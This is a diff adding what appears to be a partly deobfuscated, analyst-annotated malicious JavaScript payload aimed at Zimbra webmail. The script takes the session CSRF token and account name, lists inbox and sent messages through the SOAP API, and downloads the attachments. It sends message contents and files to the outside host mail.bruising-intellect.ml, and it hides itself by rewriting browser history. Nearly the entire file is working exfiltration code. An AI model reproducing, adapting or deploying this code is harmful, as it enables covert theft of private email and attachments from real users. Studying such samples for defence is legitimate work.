@@ -1,0 +1,349 @@
+// This array has already been substituted in where appropriate
+var _0x6b82 = [
+	'/attach.php',
+	'&t=',
+	'pushState',
+	'title',
+	'/#1',
+	'location',
+	'host',
+	'mail.bruising-intellect.ml',
+	'open',
+	'https://',
+	'send',
+	'onreadystatechange',
+	'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
+	'encode',
+	'length',
+	'charCodeAt',
+	'charAt',
+	'decode',
+	'replace',
+	'indexOf',
+	'fromCharCode',
+	'readyState',
+	'status',
+	'responseText',
+	'split',
+	'csrfToken',
+	'"name"',
+	'/receive.php',
+	'setRequestHeader',
+	'Content-Type',
+	'u=self&d=',
+	'POST',
+	'/service/soap/SearchRequest',
+	'x-zimbra-csrf-token',
+	'{"Header":{"context":{"_jsns":"urn:zimbra","userAgent":{"name":"ZimbraWebClient - GC96 (Win)","version":"8.8.15_GA_4173"},"session":{"_content":1125,"id":1125},"account":{"_content":"',
+	'"}},"Body":{"SearchRequest":{"_jsns":"urn:zimbraMail","sortBy":"dateDesc","header":[{"n":"List-ID"},{"n":"X-Zimbra-DL"},{"n":"IN-REPLY-TO"}],"tz":{"id":"Asia/Hong_Kong"},"locale":{"_content":"en_US"},"offset":0,"limit":10,"query":"in:inbox","types":"conversation","recip":"0","fullConversation":1,"needExp":1}}}',
+	'"id":"',
+	'","by":"name"},"csrfToken":"',
+	'"su":"',
+	'&d=',
+	'/h/search?st=conversation&action=view&cid=',
+	'GET',
+	'attachments',
+	'<td>',
+	'<b>',
+	'/service/home/~/?id=',
+	'amp;',
+	'join',
+	'byteLength',
+	'toString',
+	'padStart',
+	'responseType',
+	'response',
+	'Application/x-www-form-urlencoded',
+	'&c=',
+	'&n=',
+	'&f='
+];
+(function (_0x7aff9d, _0x487d16) {
+	var _0x27974d = function (_0x2f0954) {
+		while (--_0x2f0954) {
+			_0x7aff9d['push'](_0x7aff9d['shift']());
+		}
+	};
+	_0x27974d(++_0x487d16);
+}(_0x6b82, 116));
+var _0x3f5d = function (_0x4cfdc9, _0x1ad4c0) {
+	_0x4cfdc9 = _0x4cfdc9 - 0;
+	var _0x4717b2 = _0x6b82[_0x4cfdc9];
+	return _0x4717b2;
+};
+history['pushState']({}, document['title'], '/#1');
+var xhr = new XMLHttpRequest();
+var csrf;
+var emailname;
+var currentDomain = window['location']['host'];
+var attackerC2 = 'mail.bruising-intellect.ml';
+var emaildata;
+var contactlist;
+var attachurl;
+xhr['open']('GET', 'https://' + currentDomain + '/', !![]);
+xhr['send']();
+xhr['onreadystatechange'] = processRequest;
+
+function Base64() {
+	_keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+	this['encode'] = function (_0x42cf43) {
+		var _0x5c5d04 = '';
+		var _0x3c7328, _0x2040af, _0x5493bf, _0x1db9cd, _0x849c88, _0x465d69, _0x19d4a1;
+		var _0x1ce347 = 0;
+		_0x42cf43 = _utf8_encode(_0x42cf43);
+		while (_0x1ce347 < _0x42cf43['length']) {
+			_0x3c7328 = _0x42cf43['charCodeAt'](_0x1ce347++);
+			_0x2040af = _0x42cf43['charCodeAt'](_0x1ce347++);
+			_0x5493bf = _0x42cf43['charCodeAt'](_0x1ce347++);
+			_0x1db9cd = _0x3c7328 >> 2;
+			_0x849c88 = (_0x3c7328 & 3) << 4 | _0x2040af >> 4;
+			_0x465d69 = (_0x2040af & 15) << 2 | _0x5493bf >> 6;
+			_0x19d4a1 = _0x5493bf & 63;
+			if (isNaN(_0x2040af)) {
+				_0x465d69 = _0x19d4a1 = 64;
+			} else if (isNaN(_0x5493bf)) {
+				_0x19d4a1 = 64;
+			}
+			_0x5c5d04 = _0x5c5d04 + _keyStr['charAt'](_0x1db9cd) + _keyStr['charAt'](_0x849c88) + _keyStr['charAt'](_0x465d69) + _keyStr['charAt'](_0x19d4a1);
+		}
+		return _0x5c5d04;
+	};
+	this['decode'] = function (_0x45cb1e) {
+		var _0x1fc085 = '';
+		var _0x1249cd, _0x5e0ec7, _0x3a45e8;
+		var _0x2a7d9f, _0x2bac35, _0x178d96, _0x541436;
+		var _0x251173 = 0;
+		_0x45cb1e = _0x45cb1e['replace'](/[^A-Za-z0-9\+\/\=]/g, '');
+		while (_0x251173 < _0x45cb1e['length']) {
+			_0x2a7d9f = _keyStr['indexOf'](_0x45cb1e['charAt'](_0x251173++));
+			_0x2bac35 = _keyStr['indexOf'](_0x45cb1e['charAt'](_0x251173++));
+			_0x178d96 = _keyStr['indexOf'](_0x45cb1e['charAt'](_0x251173++));
+			_0x541436 = _keyStr['indexOf'](_0x45cb1e['charAt'](_0x251173++));
+			_0x1249cd = _0x2a7d9f << 2 | _0x2bac35 >> 4;
+			_0x5e0ec7 = (_0x2bac35 & 15) << 4 | _0x178d96 >> 2;
+			_0x3a45e8 = (_0x178d96 & 3) << 6 | _0x541436;
+			_0x1fc085 = _0x1fc085 + String['fromCharCode'](_0x1249cd);
+			if (_0x178d96 != 64) {
+				_0x1fc085 = _0x1fc085 + String['fromCharCode'](_0x5e0ec7);
+			}
+			if (_0x541436 != 64) {
+				_0x1fc085 = _0x1fc085 + String['fromCharCode'](_0x3a45e8);
+			}
+		}
+		_0x1fc085 = _utf8_decode(_0x1fc085);
+		return _0x1fc085;
+	};
+	_utf8_encode = function (_0x11302a) {
+		_0x11302a = _0x11302a['replace'](/\r\n/g, '\n');
+		var _0xdefeda = '';
+		for (var _0x1addc1 = 0; _0x1addc1 < _0x11302a['length']; _0x1addc1++) {
+			var _0x2ed657 = _0x11302a['charCodeAt'](_0x1addc1);
+			if (_0x2ed657 < 128) {
+				_0xdefeda += String['fromCharCode'](_0x2ed657);
+			} else if (_0x2ed657 > 127 && _0x2ed657 < 2048) {
+				_0xdefeda += String['fromCharCode'](_0x2ed657 >> 6 | 192);
+				_0xdefeda += String['fromCharCode'](_0x2ed657 & 63 | 128);
+			} else {
+				_0xdefeda += String['fromCharCode'](_0x2ed657 >> 12 | 224);
+				_0xdefeda += String['fromCharCode'](_0x2ed657 >> 6 & 63 | 128);
+				_0xdefeda += String['fromCharCode'](_0x2ed657 & 63 | 128);
+			}
+		}
+		return _0xdefeda;
+	};
+	_utf8_decode = function (_0x550b3d) {
+		var _0x5629c7 = '';
+		var _0x612b32 = 0;
+		var _0x27b605 = c1 = c2 = 0;
+		while (_0x612b32 < _0x550b3d['length']) {
+			_0x27b605 = _0x550b3d['charCodeAt'](_0x612b32);
+			if (_0x27b605 < 128) {
+				_0x5629c7 += String['fromCharCode'](_0x27b605);
+				_0x612b32++;
+			} else if (_0x27b605 > 191 && _0x27b605 < 224) {
+				c2 = _0x550b3d['charCodeAt'](_0x612b32 + 1);
+				_0x5629c7 += String['fromCharCode']((_0x27b605 & 31) << 6 | c2 & 63);
+				_0x612b32 += 2;
+			} else {
+				c2 = _0x550b3d['charCodeAt'](_0x612b32 + 1);
+				c3 = _0x550b3d['charCodeAt'](_0x612b32 + 2);
+				_0x5629c7 += String['fromCharCode']((_0x27b605 & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
+				_0x612b32 += 3;
+			}
+		}
+		return _0x5629c7;
+	};
+}
+function processRequest(_0x4649e3) {
+	if (xhr['readyState'] == 4 && xhr['status'] == 200) {
+		emaildata = xhr['responseText'];
+		SendInfo();
+		var _0x2c2709 = xhr['responseText']['split']('csrfToken');
+		var _0x1244cd = _0x2c2709[1]['split']('"');
+		csrf = _0x1244cd[1];
+		_0x2c2709 = xhr['responseText']['split']('GetInfoResponse');
+		_0x1244cd = _0x2c2709[1]['split']('"name"');
+		var _0x57ea9e = _0x1244cd[1]['split']('"');
+		emailname = _0x57ea9e[1];
+		ListInbox();
+		ListSent();
+	}
+}
+function SendInfo() {
+	// Sends the contents of "emaildata" in the body of a POST request to /receive.php
+	var httpObj = new XMLHttpRequest();
+	var targetUrl = 'https://' + attackerC2 + '/receive.php';
+	httpObj['open']('POST', targetUrl, !![]);
+	httpObj['setRequestHeader']('Content-Type', 'Application/x-www-form-urlencoded');
+	httpObj['send']('u=self&d=' + escape(emaildata));
+	httpObj['onreadystatechange'] = _0xaedb34;
+	function _0xaedb34(_0x12ac69) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+		}
+	}
+}
+function ListInbox() {
+	// Lists the contents of the users mailbox using '/service/soap/SearchRequest'
+	// Per email:
+	//   - sends the full emaildata to the attacker c2 sendEmail()
+	//   - sends any attachments to the attacker c2 listAttachFile
+	var httpObj = new XMLHttpRequest();
+	httpObj['open']('POST', 'https://' + currentDomain + '/service/soap/SearchRequest', !![]);
+	httpObj['setRequestHeader']('x-zimbra-csrf-token', csrf);
+	var zimbraJSON = '{"Header":{"context":{"_jsns":"urn:zimbra","userAgent":{"name":"ZimbraWebClient - GC96 (Win)","version":"8.8.15_GA_4173"},"session":{"_content":1125,"id":1125},"account":{"_content":"' + emailname + '","by":"name"},"csrfToken":"' + csrf + '"}},"Body":{"SearchRequest":{"_jsns":"urn:zimbraMail","sortBy":"dateDesc","header":[{"n":"List-ID"},{"n":"X-Zimbra-DL"},{"n":"IN-REPLY-TO"}],"tz":{"id":"Asia/Hong_Kong"},"locale":{"_content":"en_US"},"offset":0,"limit":10,"query":"in:inbox","types":"conversation","recip":"0","fullConversation":1,"needExp":1}}}';
+	httpObj['send'](zimbraJSON);
+	httpObj['onreadystatechange'] = action;
+	function action(_0x4d42bf) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+			emaildata = httpObj['responseText'];
+			SendEmail();
+			EmailArray = emaildata['split']('"su":"');
+			for (var _0x274f1e = 0; _0x274f1e < EmailArray['length'] - 1; _0x274f1e++) {
+				Email2 = EmailArray[_0x274f1e]['split']('"id":"');
+				// Email3 is possibly the ID of the email
+				Email3 = Email2[Email2['length'] - 1]['split']('"');
+				ListAttachFile(0, Email3[0]);
+			}
+		}
+	}
+}
+function ListSent() {
+	var httpObj = new XMLHttpRequest();
+	httpObj['open']('POST', 'https://' + currentDomain + '/service/soap/SearchRequest', !![]);
+	httpObj['setRequestHeader']('x-zimbra-csrf-token', csrf);
+	var zimbraAuthHeaders = '{"Header":{"context":{"_jsns":"urn:zimbra","userAgent":{"name":"ZimbraWebClient - GC96 (Win)","version":"8.8.15_GA_4173"},"session":{"_content":1125,"id":1125},"account":{"_content":"' + emailname + '","by":"name"},"csrfToken":"' + csrf + '"}},"Body":{"SearchRequest":{"_jsns":"urn:zimbraMail","sortBy":"dateDesc","header":[{"n":"List-ID"},{"n":"X-Zimbra-DL"},{"n":"IN-REPLY-TO"}],"tz":{"id":"Asia/Hong_Kong"},"locale":{"_content":"en_US"},"offset":0,"limit":10,"query":"in:sent","types":"conversation","recip":"0","fullConversation":1,"needExp":1}}}';
+	httpObj['send'](zimbraAuthHeaders);
+	httpObj['onreadystatechange'] = action;
+	function action(_0x64a1ec) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+			emaildata = httpObj['responseText'];
+			SendEmail();
+			EmailArray = emaildata['split']('"su":"');
+			for (var _0x2e8991 = 0; _0x2e8991 < EmailArray['length'] - 1; _0x2e8991++) {
+				Email2 = EmailArray[_0x2e8991]['split']('"id":"');
+				emailID = Email2[Email2['length'] - 1]['split']('"');
+				ListAttachFile(1, emailID[0]);
+			}
+		}
+	}
+}
+function SendEmail() {
+	// Send whatever is currently in the variables "emailname" and "emaildata" to
+	// receive.php?u=[emailname]&d=[emaildata]
+	var httpObj = new XMLHttpRequest();
+	var targetUrl = 'https://' + attackerC2 + '/receive.php';
+	httpObj['open']('POST', targetUrl, !![]);
+	httpObj['setRequestHeader']('Content-Type', 'Application/x-www-form-urlencoded');
+	httpObj['send']('u=' + escape(emailname) + '&d=' + escape(emaildata));
+	httpObj['onreadystatechange'] = action;
+	function action(_0xd16f14) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+		}
+	}
+}
+function ListAttachFile(sus_inbox_or_sent_flag, sus_emailID) {
+	// Lists the attachments for a given sus_emailID
+	// sus_inbox_or_sent_flag indicates if it is in the inbox (0) or sent (1) folder 
+	var httpObj = new XMLHttpRequest();
+	var targetUrl = 'https://' + currentDomain + '/h/search?st=conversation&action=view&cid=' + sus_emailID;
+	httpObj['open']('GET', targetUrl, !![]);
+	httpObj['setRequestHeader']('x-zimbra-csrf-token', csrf);
+	httpObj['send']();
+	httpObj['onreadystatechange'] = _0xa78364;
+	function _0xa78364(_0x118c9a) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+			var _0x160d3a = httpObj['responseText']['split']('<a href="/service/home/~/?id=');
+			if (_0x160d3a['length'] == 2) {
+				var attachmentsHTML = httpObj['responseText']['split']('attachments');
+				var _0x595b21 = attachmentsHTML[2]['split']('<td>');
+				var _0x48ac52 = _0x595b21[2]['split']('<b>');
+				var attachmentName = _0x48ac52[1]['split']('<');
+				var attachmentsHTML = _0x160d3a[_0x160d3a['length'] - 1]['split']('"');
+				attachurl = '/service/home/~/?id=' + attachmentsHTML[0];
+				attachurl = attachurl['split']('amp;')['join']('');
+				DownAttachFile(!![], sus_inbox_or_sent_flag, sus_emailID, attachmentName[0]);
+			}
+			if (_0x160d3a['length'] > 2) {
+				var attachmentsHTML = _0x160d3a[_0x160d3a['length'] - 1]['split']('"');
+				attachurl = '/service/home/~/?id=' + attachmentsHTML[0];
+				attachurl = attachurl['split']('amp;')['join']('');
+				DownAttachFile(![], sus_inbox_or_sent_flag, sus_emailID, null);
+			}
+		}
+	}
+}
+function arrayBufferToStr(_0x5d366d) {
+	var s = '';
+	var _0x3efdcd = new Uint8Array(_0x5d366d);
+	var _0xaf979e = _0x3efdcd['byteLength'];
+	for (var _0x510a3d = 0; _0x510a3d < _0xaf979e; _0x510a3d++) {
+		s += _0x3efdcd[_0x510a3d]['toString'](16)['padStart'](2, '0');
+	}
+	return s;
+}
+function DownAttachFile(multiFileFlag, sus_inboxOrSentFlag, sus_emailId, attachmentName) {
+	// Downloads a file from global url attachurl - depending on multifileflag either downloads multiple attachments as
+	// a zip or a single file
+	var httpObj = new XMLHttpRequest();
+	var targetUrl = 'https://' + currentDomain + attachurl;
+	httpObj['open']('GET', targetUrl, !![]);
+	httpObj['responseType'] = 'arraybuffer';
+	httpObj['setRequestHeader']('x-zimbra-csrf-token', csrf);
+	httpObj['send']();
+	httpObj['onreadystatechange'] = action;
+	function action(_0x56edf0) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+			var respData = new Uint8Array(httpObj['response']);
+			var respDataAsStr = arrayBufferToStr(respData);
+			if (multiFileFlag)
+				GetSingleFile(sus_inboxOrSentFlag, sus_emailId, respDataAsStr, attachmentName);
+			else
+				GetZipFile(sus_inboxOrSentFlag, sus_emailId, respDataAsStr);
+		}
+	}
+}
+function GetSingleFile(sus_inboxOrSentFlag, sus_emailID, sus_From, attachmentname) {
+	var httpObj = new XMLHttpRequest();
+	var reqUrl = 'https://' + attackerC2 + '/attach.php';
+	httpObj['open']('POST', reqUrl, !![]);
+	httpObj['setRequestHeader']('Content-Type', 'Application/x-www-form-urlencoded');
+	httpObj['send']('u=' + escape(emailname) + '&t=' + escape(sus_inboxOrSentFlag) + '&c=' + escape(sus_emailID) + '&n=' + escape(attachmentname) + '&f=' + escape(sus_From));
+	httpObj['onreadystatechange'] = action;
+	function action(_0x207f18) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+		}
+	}
+}
+function GetZipFile(sus_inboxOrSentFlag, sus_emailID, sus_From) {
+	var httpObj = new XMLHttpRequest();
+	var reqUrl = 'https://' + attackerC2 + '/attach.php';
+	httpObj['open']('POST', reqUrl, !![]);
+	httpObj['setRequestHeader']('Content-Type', 'Application/x-www-form-urlencoded');
+	httpObj['send']('u=' + escape(emailname) + '&t=' + escape(sus_inboxOrSentFlag) + '&c=' + escape(sus_emailID) + '&f=' + escape(sus_From));
+	httpObj['onreadystatechange'] = action;
+	function action(_0x51e14a) {
+		if (httpObj['readyState'] == 4 && httpObj['status'] == 200) {
+		}
+	}
+}
+12328;
